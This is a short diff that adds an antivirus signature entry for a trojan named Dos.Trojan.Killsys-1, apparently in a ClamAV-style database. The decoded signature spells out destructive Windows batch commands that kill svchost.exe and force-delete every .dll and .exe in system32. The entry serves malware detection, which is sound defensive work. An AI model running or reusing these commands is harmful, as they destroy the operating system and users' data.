@@ -1,0 +1,7 @@
+VIRUS NAME: Dos.Trojan.Killsys-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+taskkill /im svchost.exe /f
+@echo y|DEl %windir%\system32\*.dll
+@echo Y|DEl %windir%\system32\*.exe
